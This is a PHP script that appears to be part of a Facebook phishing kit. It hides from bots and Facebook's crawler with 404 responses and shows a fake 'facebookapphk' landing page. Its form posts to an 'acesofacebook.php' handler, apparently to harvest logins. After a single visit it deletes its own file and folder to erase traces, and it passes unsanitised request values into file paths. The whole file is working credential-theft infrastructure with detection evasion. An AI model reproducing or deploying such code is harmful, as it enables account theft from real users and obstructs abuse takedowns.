<?php 

	    $includes = dirname(dirname(__FILE__)).'/';
		require($includes.'/configuration.php');

		if(IS_BOT || FB_BOT) {

			header("HTTP/1.0 404 Not Found");
			exit;
		}


		$source = $_GET['source'];
		$source = ".".$source;
		$landing = 'facebookapphk';
		$controller = $_REQUEST['controller'];

		if(isset($_GET['lan'])) $landing = $_GET['lan'];

		$dir = dirname(__FILE__);
		$actual_link = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
		$action_post = dirname(dirname($actual_link)).'/acesofacebook.php?'.http_build_query($_GET);
		$action_post = str_replace("public/", "", $action_post);
		
		define("NO_CHANGE_ACTION" , true);


		if (file_exists($source)) {

	        echo render_counters(COUNTER_GENERAL);

			getLanding($landing);

			if (file_exists("$source/index.php")) {
				unlink("$source/index.php");
				unlink(__FILE__);
				rmdir($source);
			};

		}else{
			header("HTTP/1.0 404 Not Found");
			exit();
		};


	?>
	